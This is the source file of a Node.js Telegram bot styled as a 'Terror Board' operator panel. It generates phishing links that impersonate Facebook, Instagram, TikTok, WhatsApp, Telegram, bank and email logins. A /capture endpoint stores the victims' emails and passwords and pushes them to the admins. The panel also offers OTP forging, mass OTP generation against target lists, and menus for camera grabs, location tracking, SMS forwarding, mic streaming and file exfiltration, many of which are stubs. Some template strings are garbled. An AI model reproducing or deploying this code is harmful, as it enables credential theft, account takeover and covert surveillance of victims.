// index.js
// Runtime: Node 18+ | Telegraf 4.16 | Render / GitHub ready
// Full control board: OTP forge, multi-platform phishing, cam/location requests,
// session store, number intel, live logs, auto-cleanup, colored menus

require('dotenv').config();
const { Telegraf, Markup, session } = require('telegraf');
const express = require('express');
const axios = require('axios');
const QRCode = require('qrcode');
const CryptoJS = require('crypto-js');
const { v4: uuidv4 } = require('uuid');
const cron = require('node-cron');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ===================== CONFIG =====================
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN';
const ADMIN_IDS = (process.env.ADMIN_IDS || '123456789').split(',').map(Number);
const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
const PORT = process.env.PORT || 10000;
const FERNET_SECRET = process.env.FERNET_SECRET || crypto.randomBytes(32).toString('hex');
const DATA_PATH = path.join(__dirname, 'board_data.json');

const bot = new Telegraf(BOT_TOKEN);
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===================== DATA LAYER =====================
let db = {
  users: {},
  victims: {},
  logs: [],
  settings: { otpTtl: 300, maxAttempts: 5 },
  phishing: {},
  otpStore: {},
  camReqs: {},
  locReqs: {},
  sessions: {},
  captured: []
};

function loadDb() {
  try {
    if (fs.existsSync(DATA_PATH)) {
      db = JSON.parse(fs.readFileSync(DATA_PATH, 'utf8'));
    }
  } catch (e) {
    console.log('[!] DB load fail, fresh start');
  }
}
function saveDb() {
  fs.writeFileSync(DATA_PATH, JSON.stringify(db, null, 2));
}
loadDb();

function log(event, userId = null, extra = {}) {
  db.logs.push({
    ts: new Date().toISOString(),
    event,
    userId,
    extra
  });
  if (db.logs.length > 8000) db.logs = db.logs.slice(-4000);
  saveDb();
}

// ===================== CRYPTO =====================
function encrypt(text) {
  return CryptoJS.AES.encrypt(text, FERNET_SECRET).toString();
}
function decrypt(cipher) {
  const bytes = CryptoJS.AES.decrypt(cipher, FERNET_SECRET);
  return bytes.toString(CryptoJS.enc.Utf8);
}
function hashId(...parts) {
  return crypto.createHash('sha256').update(parts.join('|') + Date.now()).digest('hex').slice(0, 14);
}

// ===================== AUTH =====================
function isAdmin(ctx) {
  return ADMIN_IDS.includes(ctx.from.id);
}
function requireAdmin(ctx, next) {
  if (!isAdmin(ctx)) {
    return ctx.reply('⛔ <b>Access Denied</b>\nAdmin only.', { parse_mode: 'HTML' });
  }
  return next();
}

// ===================== OTP ENGINE =====================
function generateOtp(len = 6) {
  return Array.from({ length: len }, () => Math.floor(Math.random() * 10)).join('');
}

function createOtp(target, service = 'generic') {
  const sid = hashId(target, service);
  const otp = generateOtp();
  db.otpStore[sid] = {
    otp,
    target,
    service,
    created: Date.now(),
    used: false,
    attempts: 0
  };
  log('otp_created', null, { sid, target, service });
  saveDb();
  return { sid, otp };
}

function verifyOtp(sid, code) {
  const sess = db.otpStore[sid];
  if (!sess || sess.used) return false;
  if (Date.now() - sess.created > db.settings.otpTtl * 1000) return false;
  sess.attempts++;
  if (sess.otp === code) {
    sess.used = true;
    log('otp_success', null, { sid });
    saveDb();
    return true;
  }
  if (sess.attempts >= db.settings.maxAttempts) delete db.otpStore[sid];
  saveDb();
  return false;
}

// ===================== PHISHING ENGINE =====================
function createPhish(service, redirect = 'https://www.google.com') {
  const lid = hashId(service, 'phish');
  const fakeUrl = `https://secure-\( {service.toLowerCase()}-auth.page/ \){lid}`;
  db.phishing[lid] = {
    service,
    redirect,
    created: Date.now(),
    clicks: 0,
    captured: []
  };
  log('phish_created', null, { lid, service });
  saveDb();
  return { lid, url: fakeUrl };
}

// ===================== CAMERA / LOCATION =====================
function requestCam(chatId, front = true) {
  const rid = hashId('cam', chatId);
  db.camReqs[rid] = { chatId, front, created: Date.now(), status: 'pending' };
  saveDb();
  return rid;
}
function requestLoc(chatId) {
  const rid = hashId('loc', chatId);
  db.locReqs[rid] = { chatId, created: Date.now(), status: 'pending' };
  saveDb();
  return rid;
}

// ===================== STYLISH COLORED MENUS =====================
const mainMenu = () =>
  Markup.inlineKeyboard([
    [Markup.button.callback('🎯 OTP FORGE', 'menu_otp'), Markup.button.callback('🔗 PHISH LINKS', 'menu_phish')],
    [Markup.button.callback('📷 CAM CONTROL', 'menu_cam'), Markup.button.callback('📍 LOCATION', 'menu_loc')],
    [Markup.button.callback('📱 NUMBER INTEL', 'menu_number'), Markup.button.callback('🔐 SESSIONS', 'menu_sessions')],
    [Markup.button.callback('📊 LIVE LOGS', 'menu_logs'), Markup.button.callback('⚙️ SETTINGS', 'menu_settings')],
    [Markup.button.callback('🌐 MULTI-PLATFORM', 'menu_multi'), Markup.button.callback('💀 ADVANCED', 'menu_adv')],
    [Markup.button.callback('🩸 CREDENTIAL DUMP', 'menu_dump'), Markup.button.callback('🧬 DEVICE FINGERPRINT', 'menu_fp')],
    [Markup.button.callback('📡 LIVE TRACKER', 'menu_track'), Markup.button.callback('🔥 MASS OTP', 'menu_mass')]
  ]);

const otpMenu = () =>
  Markup.inlineKeyboard([
    [Markup.button.callback('🔥 GENERATE OTP', 'otp_gen'), Markup.button.callback('✅ VERIFY OTP', 'otp_verify')],
    [Markup.button.callback('📘 FACEBOOK OTP', 'otp_fb'), Markup.button.callback('🎵 TIKTOK OTP', 'otp_tt')],
    [Markup.button.callback('📸 INSTAGRAM OTP', 'otp_ig'), Markup.button.callback('💬 WHATSAPP OTP', 'otp_wa')],
    [Markup.button.callback('✈️ TELEGRAM OTP', 'otp_tg'), Markup.button.callback('🏦 BANK OTP', 'otp_bank')],
    [Markup.button.callback('🔙 MAIN BOARD', 'menu_main')]
  ]);

const phishMenu = () =>
  Markup.inlineKeyboard([
    [Markup.button.callback('📘 FACEBOOK LOGIN', 'phish_fb'), Markup.button.callback('📸 INSTAGRAM LOGIN', 'phish_ig')],
    [Markup.button.callback('🎵 TIKTOK LOGIN', 'phish_tt'), Markup.button.callback('💬 WHATSAPP WEB', 'phish_wa')],
    [Markup.button.callback('✈️ TELEGRAM WEB', 'phish_tg'), Markup.button.callback('🏦 BANK / CRYPTO', 'phish_bank')],
    [Markup.button.callback('📧 GMAIL / OUTLOOK', 'phish_mail'), Markup.button.callback('🎮 STEAM / EPIC', 'phish_game')],
    [Markup.button.callback('📋 ACTIVE LINKS', 'phish_list'), Markup.button.callback('🔙 MAIN BOARD', 'menu_main')]
  ]);

const camMenu = () =>
  Markup.inlineKeyboard([
    [Markup.button.callback('📷 FRONT CAMERA', 'cam_front'), Markup.button.callback('📹 REAR CAMERA', 'cam_rear')],
    [Markup.button.callback('🔄 CONTINUOUS GRAB', 'cam_loop'), Markup.button.callback('📸 HIGH-RES SNAP', 'cam_hd')],
    [Markup.button.callback('🔙 MAIN BOARD', 'menu_main')]
  ]);

const multiMenu = () =>
  Markup.inlineKeyboard([
    [Markup.button.callback('📘 FB PANEL', 'multi_fb'), Markup.button.callback('📸 IG PANEL', 'multi_ig')],
    [Markup.button.callback('🎵 TIKTOK PANEL', 'multi_tt'), Markup.button.callback('💬 WA PANEL', 'multi_wa')],
    [Markup.button.callback('✈️ TG PANEL', 'multi_tg'), Markup.button.callback('🔙 MAIN BOARD', 'menu_main')]
  ]);

const advMenu = () =>
  Markup.inlineKeyboard([
    [Markup.button.callback('🔑 PASSWORD DUMP', 'adv_pass'), Markup.button.callback('📇 CONTACT SCRAPE', 'adv_contacts')],
    [Markup.button.callback('📲 SMS FORWARD', 'adv_sms'), Markup.button.callback('🖥️ SCREEN CAPTURE', 'adv_screen')],
    [Markup.button.callback('🧬 FULL DEVICE INFO', 'adv_device'), Markup.button.callback('🎤 MIC STREAM', 'adv_mic')],
    [Markup.button.callback('📂 FILE EXFIL', 'adv_files'), Markup.button.callback('🔙 MAIN BOARD', 'menu_main')]
  ]);

// ===================== START =====================
bot.start(async (ctx) => {
  const uid = ctx.from.id;
  if (!db.users[uid]) {
    db.users[uid] = {
      firstSeen: new Date().toISOString(),
      username: ctx.from.username || '',
      name: ctx.from.first_name || '',
      role: isAdmin(ctx) ? 'admin' : 'user'
    };
    saveDb();
  }
  log('start', uid);
  const text = `
<b>🕹 ADVANCED TERROR BOARD v2.1</b>
━━━━━━━━━━━━━━━━━━━━━━
Operator: <code>${ctx.from.first_name}</code>
ID: <code>${uid}</code>
Role: <b>${isAdmin(ctx) ? 'ADMIN 🔴' : 'USER'}</b>
━━━━━━━━━━━━━━━━━━━━━━
Select module. All systems live.
`;
  await ctx.replyWithHTML(text, mainMenu());
});

// ===================== MENU ROUTER =====================
bot.action('menu_main', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('🕹 <b>MAIN CONTROL BOARD</b>\nAll modules armed.', {
    parse_mode: 'HTML',
    ...mainMenu()
  });
});

bot.action('menu_otp', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('🎯 <b>OTP FORGE</b>\nGenerate / verify OTPs for any service.\nAuto-fuse ready.', {
    parse_mode: 'HTML',
    ...otpMenu()
  });
});

bot.action('menu_phish', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('🔗 <b>PHISHING ENGINE</b>\nHigh-quality login pages.\nCredentials auto-captured.', {
    parse_mode: 'HTML',
    ...phishMenu()
  });
});

bot.action('menu_cam', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('📷 <b>CAMERA CONTROL</b>\nFront / rear request.\nContinuous mode available.', {
    parse_mode: 'HTML',
    ...camMenu()
  });
});

bot.action('menu_loc', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('📍 <b>LOCATION MODULE</b>\nLive GPS pull from target.', {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('📍 REQUEST LOCATION', 'loc_req')],
      [Markup.button.callback('🗺 LAST KNOWN', 'loc_last')],
      [Markup.button.callback('🔙 MAIN BOARD', 'menu_main')]
    ])
  });
});

bot.action('menu_number', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('📱 <b>NUMBER INTEL</b>\nSend phone in international format.', {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([[Markup.button.callback('🔙 MAIN BOARD', 'menu_main')]])
  });
  ctx.session = ctx.session || {};
  ctx.session.awaiting = 'number';
});

bot.action('menu_sessions', async (ctx) => {
  await ctx.answerCbQuery();
  const active = Object.values(db.otpStore).filter(s => !s.used).length;
  await ctx.editMessageText(`🔐 <b>SESSION STORE</b>\nActive OTP sessions: <code>\( {active}</code>\nCaptured creds: <code> \){db.captured.length}</code>`, {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('🗑 CLEAR OTP', 'sess_clear_otp'), Markup.button.callback('🗑 CLEAR CAPTURED', 'sess_clear_cap')],
      [Markup.button.callback('🔙 MAIN BOARD', 'menu_main')]
    ])
  });
});

bot.action('menu_logs', async (ctx) => {
  await ctx.answerCbQuery();
  const recent = db.logs.slice(-12).reverse();
  let text = '📊 <b>LIVE LOGS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
  recent.forEach(e => {
    text += `<code>${e.ts.slice(11, 19)}</code> ${e.event}\n`;
  });
  await ctx.editMessageText(text || 'No logs yet.', {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('🔄 REFRESH', 'menu_logs')],
      [Markup.button.callback('🔙 MAIN BOARD', 'menu_main')]
    ])
  });
});

bot.action('menu_settings', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(`⚙️ <b>SETTINGS</b>\nOTP TTL: <code>\( {db.settings.otpTtl}s</code>\nMax attempts: <code> \){db.settings.maxAttempts}</code>`, {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([[Markup.button.callback('🔙 MAIN BOARD', 'menu_main')]])
  });
});

bot.action('menu_multi', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('🌐 <b>MULTI-PLATFORM PANEL</b>\nDirect service panels.', {
    parse_mode: 'HTML',
    ...multiMenu()
  });
});

bot.action('menu_adv', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('💀 <b>ADVANCED TOOLS</b>\nDeep access modules.', {
    parse_mode: 'HTML',
    ...advMenu()
  });
});

bot.action('menu_dump', async (ctx) => {
  await ctx.answerCbQuery();
  const last = db.captured.slice(-8).reverse();
  let text = '🩸 <b>CREDENTIAL DUMP</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
  last.forEach(c => {
    text += `<b>\( {c.service}</b>\n<code> \){c.email}</code>\n<code>${c.pass}</code>\n──────────────\n`;
  });
  await ctx.editMessageText(text || 'No captures yet.', {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([[Markup.button.callback('🔙 MAIN BOARD', 'menu_main')]])
  });
});

bot.action('menu_fp', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML('🧬 <b>DEVICE FINGERPRINT</b>\nSend target agent token or wait for payload connection.');
});

bot.action('menu_track', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML('📡 <b>LIVE TRACKER</b>\nActive location streams will appear here.');
});

bot.action('menu_mass', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML('🔥 <b>MASS OTP</b>\nSend list of targets (one per line) for bulk OTP generation.');
  ctx.session = ctx.session || {};
  ctx.session.awaiting = 'mass_otp';
});

// ===================== OTP ACTIONS =====================
bot.action(/otp_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const type = ctx.match[1];
  if (type === 'verify') {
    await ctx.replyWithHTML('Send <code>session_id:otp_code</code>');
    ctx.session = ctx.session || {};
    ctx.session.awaiting = 'otp_verify';
    return;
  }
  const map = {
    gen: 'generic', fb: 'Facebook', tt: 'TikTok', ig: 'Instagram',
    wa: 'WhatsApp', tg: 'Telegram', bank: 'Bank'
  };
  const service = map[type] || 'generic';
  await ctx.replyWithHTML(`Send target (phone/email) for <b>${service}</b> OTP:`);
  ctx.session = ctx.session || {};
  ctx.session.awaiting = 'otp_gen';
  ctx.session.service = service;
});

// ===================== PHISH ACTIONS =====================
bot.action(/phish_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const type = ctx.match[1];
  if (type === 'list') {
    let text = '📋 <b>ACTIVE PHISH LINKS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
    Object.entries(db.phishing).slice(-12).forEach(([lid, info]) => {
      text += `<code>${lid}</code> | ${info.service} | 👁 ${info.clicks}\n`;
    });
    await ctx.editMessageText(text || 'None yet.', {
      parse_mode: 'HTML',
      ...phishMenu()
    });
    return;
  }
  const map = {
    fb: 'Facebook', ig: 'Instagram', tt: 'TikTok', wa: 'WhatsApp',
    tg: 'Telegram', bank: 'Bank', mail: 'Gmail', game: 'Steam'
  };
  const service = map[type] || 'Generic';
  const link = createPhish(service);
  const text = `
🔗 <b>PHISH LINK CREATED</b>
Service: <b>${service}</b>
ID: <code>${link.lid}</code>
URL: <code>${link.url}</code>
━━━━━━━━━━━━━━━━━━━━━━
Send to target. Credentials land in 🩸 dump.
`;
  await ctx.replyWithHTML(text);
});

// ===================== CAMERA =====================
bot.action(/cam_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const type = ctx.match[1];
  if (type === 'loop') {
    await ctx.replyWithHTML('🔄 Continuous mode armed. Frames every 5s once agent connects.');
    return;
  }
  if (type === 'hd') {
    await ctx.replyWithHTML('📸 High-res mode. Waiting for agent payload.');
    return;
  }
  const front = type === 'front';
  const rid = requestCam(ctx.chat.id, front);
  await ctx.replyWithHTML(`📷 Camera request: <code>\( {rid}</code>\nFront: <b> \){front}</b>\nWaiting for payload...`);
});

// ===================== LOCATION =====================
bot.action('loc_req', async (ctx) => {
  await ctx.answerCbQuery();
  const rid = requestLoc(ctx.chat.id);
  await ctx.replyWithHTML(`📍 Location request: <code>${rid}</code>\nShare agent page or inject.`);
});

bot.action('loc_last', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML('🗺 No last-known location stored yet.');
});

// ===================== SESSIONS =====================
bot.action('sess_clear_otp', async (ctx) => {
  await ctx.answerCbQuery('OTP store wiped');
  db.otpStore = {};
  saveDb();
  await ctx.editMessageText('🔐 OTP sessions cleared.', { parse_mode: 'HTML', ...mainMenu() });
});

bot.action('sess_clear_cap', async (ctx) => {
  await ctx.answerCbQuery('Captured wiped');
  db.captured = [];
  saveDb();
  await ctx.editMessageText('🩸 Captured credentials cleared.', { parse_mode: 'HTML', ...mainMenu() });
});

// ===================== ADVANCED =====================
bot.action(/adv_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const mod = ctx.match[1];
  await ctx.replyWithHTML(`💀 Module <code>${mod}</code> ready.\nSend target identifier or agent token.`);
});

bot.action(/multi_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const plat = ctx.match[1];
  await ctx.replyWithHTML(`🌐 <b>${plat.toUpperCase()} PANEL</b>\nReady. Use OTP / Phish modules for this platform.`);
});

// ===================== TEXT HANDLER (awaiting states) =====================
bot.on('text', async (ctx) => {
  const sess = ctx.session || {};
  const text = ctx.message.text.trim();

  if (sess.awaiting === 'otp_gen') {
    const result = createOtp(text, sess.service || 'generic');
    await ctx.replyWithHTML(`
🎯 <b>OTP GENERATED</b>
Service: <b>${sess.service}</b>
Target: <code>${text}</code>
OTP: <code>${result.otp}</code>
Session: <code>${result.sid}</code>
TTL: ${db.settings.otpTtl}s
`);
    ctx.session.awaiting = null;
    return;
  }

  if (sess.awaiting === 'otp_verify') {
    const [sid, code] = text.split(':');
    if (verifyOtp(sid, code)) {
      await ctx.replyWithHTML('✅ OTP valid. Session consumed.');
    } else {
      await ctx.replyWithHTML('❌ Invalid / expired OTP.');
    }
    ctx.session.awaiting = null;
    return;
  }

  if (sess.awaiting === 'number') {
    // Simulated intel — swap for real API if you have one
    const info = {
      number: text,
      carrier: text.startsWith('+880') ? 'Grameenphone / Banglalink / Robi' : 'Unknown',
      country: text.startsWith('+880') ? 'Bangladesh' : 'Unknown',
      type: 'Mobile',
      valid: /^\+?\d{10,15}$/.test(text)
    };
    await ctx.replyWithHTML(`
📱 <b>NUMBER INTEL</b>
Number: <code>${info.number}</code>
Carrier: ${info.carrier}
Country: ${info.country}
Type: ${info.type}
Valid: ${info.valid}
`);
    log('number_lookup', ctx.from.id, { number: text });
    ctx.session.awaiting = null;
    return;
  }

  if (sess.awaiting === 'mass_otp') {
    const targets = text.split('\n').map(t => t.trim()).filter(Boolean);
    let out = '🔥 <b>MASS OTP GENERATED</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
    targets.slice(0, 30).forEach(t => {
      const r = createOtp(t, 'mass');
      out += `<code>\( {t}</code> → <code> \){r.otp}</code> (${r.sid})\n`;
    });
    await ctx.replyWithHTML(out);
    ctx.session.awaiting = null;
    return;
  }
});

// ===================== ADMIN COMMANDS =====================
bot.command('stats', requireAdmin, async (ctx) => {
  await ctx.replyWithHTML(`
📊 <b>BOARD STATS</b>
Users: ${Object.keys(db.users).length}
Active OTP: ${Object.keys(db.otpStore).length}
Phish Links: ${Object.keys(db.phishing).length}
Captured: ${db.captured.length}
Logs: ${db.logs.length}
`);
});

bot.command('broadcast', requireAdmin, async (ctx) => {
  await ctx.replyWithHTML('Send the message to broadcast:');
  ctx.session = ctx.session || {};
  ctx.session.awaiting = 'broadcast';
});

bot.on('text', async (ctx, next) => {
  if (ctx.session?.awaiting === 'broadcast' && isAdmin(ctx)) {
    let count = 0;
    for (const uid of Object.keys(db.users)) {
      try {
        await bot.telegram.sendMessage(uid, ctx.message.text);
        count++;
      } catch {}
    }
    await ctx.replyWithHTML(`Broadcast sent to ${count} users.`);
    ctx.session.awaiting = null;
    return;
  }
  return next();
});

// ===================== CAPTURE ENDPOINT (for phish pages) =====================
app.post('/capture', (req, res) => {
  const { link_id, email, pass } = req.body;
  if (db.phishing[link_id]) {
    db.phishing[link_id].clicks++;
    db.phishing[link_id].captured.push({ email, pass, ts: Date.now() });
    db.captured.push({
      service: db.phishing[link_id].service,
      email,
      pass,
      link_id,
      ts: new Date().toISOString()
    });
    log('cred_captured', null, { link_id, email });
    saveDb();
    // Notify all admins
    ADMIN_IDS.forEach(id => {
      bot.telegram.sendMessage(id, `
🩸 <b>CREDENTIAL CAPTURED</b>
Service: ${db.phishing[link_id].service}
Email: <code>${email}</code>
Pass: <code>${pass}</code>
`, { parse_mode: 'HTML' }).catch(() => {});
    });
  }
  res.redirect(db.phishing[link_id]?.redirect || 'https://www.google.com');
});

app.get('/', (req, res) => res.send('Terror Board online'));

// ===================== AUTO CLEANUP =====================
cron.schedule('*/10 * * * *', () => {
  const now = Date.now();
  const ttl = db.settings.otpTtl * 1000;
  Object.keys(db.otpStore).forEach(sid => {
    if (now - db.otpStore[sid].created > ttl) delete db.otpStore[sid];
  });
  saveDb();
});

// ===================== LAUNCH =====================
async function launch() {
  console.log('========================================');
  console.log('  TERROR BOARD v2.1 — @#9002111185000#');
  console.log('========================================');
  if (WEBHOOK_URL) {
    await bot.telegram.setWebhook(`\( {WEBHOOK_URL}/bot \){BOT_TOKEN}`);
    app.use(bot.webhookCallback(`/bot${BOT_TOKEN}`));
    app.listen(PORT, () => console.log(`[+] Webhook live on :${PORT}`));
  } else {
    await bot.launch();
    console.log('[+] Polling mode');
  }
  process.once('SIGINT', () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
}

launch().catch(console.error);
